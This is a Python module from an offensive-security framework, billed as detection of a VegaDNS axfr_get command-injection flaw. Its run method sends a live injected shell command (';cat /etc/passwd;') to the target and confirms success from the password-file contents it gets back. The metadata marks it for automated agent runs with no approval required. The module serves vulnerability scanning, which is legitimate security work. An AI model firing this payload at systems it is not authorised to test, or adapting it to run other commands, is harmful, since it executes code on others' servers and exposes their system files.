#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VegaDNS axfr_get command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VegaDNS - axfr_get RCE Detection',
        'description': (
            'Detects VegaDNS command injection via /axfr_get?domain=;cat+/etc/passwd;.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'vegadns', 'dns', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/40402/',
        ],
    }

    def run(self):
        for base in ('', '/vegadns'):
            path = f'{base}/axfr_get?hostname=ks&domain=%3bcat+/etc/passwd%3b'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='VegaDNS axfr_get command injection',
                    path=f'{base}/axfr_get',
                )
                return True
        return False
